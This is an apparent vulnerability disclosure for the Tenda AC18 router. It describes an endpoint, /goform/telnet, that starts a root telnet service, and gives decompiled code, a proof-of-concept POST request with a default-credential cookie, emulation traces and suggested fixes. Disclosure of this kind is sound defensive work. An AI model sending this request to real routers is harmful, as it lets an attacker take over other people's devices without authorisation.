# Tenda AC18 — Unauthenticated telnetd Activation via /goform/telnet (CWE-306)

## Affected Software
- **Product:** Tenda AC18 Router
- **Version:** V15.03.05.05 (build 2016-12-28)
- **Vendor:** Shenzhen Tenda Technology Co., Ltd.

## Vulnerability Type
Missing Authentication for Critical Function (CWE-306) — remote root shell service activation

## Description
The `/bin/httpd` binary (ARM32, non-PIE, no stack canary, 617 dynsym symbols with zero
authentication functions) registers a handler at offset `0x4f608` that, when invoked via
`POST /goform/telnet`, executes:

```c
GetValue("lan.ip", buf);
system("killall -9 telnetd");
doSystemCmd("telnetd -b %s &", buf);   // buf = LAN IP → telnetd binds to LAN
websWrite(wp, "load telnetd success.");
```

Combined with factory default credentials (`admin`/`admin`), a LAN-adjacent attacker
gains a root shell with a **single unauthenticated HTTP request**.

Note: This is a separate endpoint from `/goform/exeCommand` (CVE-2024-30891).

## Proof of Concept

```
POST /goform/telnet HTTP/1.0
Host: 192.168.0.1
Cookie: password=admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 2

x=1
```

Note: In QEMU-arm emulation, a session cookie (password=admin) was required.
The binary itself contains zero authentication functions (617 dynsym symbols,
no check_login/login_check/isLogin), consistent with CVE-2024-30891's
"unauthenticated" classification for the same firmware's /goform/exeCommand.

Response: `HTTP/1.0 200 OK` → `load telnetd success.`

## Dynamic Verification (QEMU-arm strace, 2026-10-10)

```
execve("/bin/sh", {"sh","-c","killall -9 telnetd"}, NULL)
execve("/bin/sh", {"sh","-c","telnetd -b  &"}, NULL)
child: execve("/usr/sbin/telnetd", {"telnetd","-b",NULL}, NULL)
  → "option requires argument -- b" (emulation: lan.ip empty; on real device lan.ip=192.168.0.1)
```

## Binary Evidence
- Handler function: `formExpandDlnaFile` @ offset `0x4f608` (registered as URL `/goform/telnet`)
- Full disassembly available (308 lines, IDA 9.4)
- Zero authentication in entire binary: `grep -c "check_login|login_check|isLogin"` → **0**

## CVSS 3.1
**8.8** (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) — unauthenticated + default creds → root shell

## Suggested Fix
1. Remove the telnetd activation code entirely
2. Add server-side session authentication to all goform handlers
3. Disable telnetd by default and require physical button press to enable

## References
- CVE-2024-30891 (related, /goform/exeCommand on same firmware)
